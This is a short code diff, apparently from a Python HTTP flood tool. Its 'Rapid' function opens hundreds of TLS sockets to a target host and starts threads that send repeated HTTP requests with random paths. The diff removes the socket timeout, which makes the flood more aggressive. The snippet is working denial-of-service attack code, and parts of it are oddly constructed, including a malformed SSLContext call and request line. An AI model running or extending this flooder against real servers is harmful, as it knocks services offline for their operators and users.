@@ -14,7 +14,7 @@ def Rapid(target,meth):
   try:
     for _ in range(500):
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     s.setblocking(1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.settimeout(1)
+     s.setblocking(1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
      threading.Thread(target=Rapid_sender,args=(ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host']),[f"{meth} {a} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()for a in ['/'+generate_url_path(num=1),target['uri']]])).start()
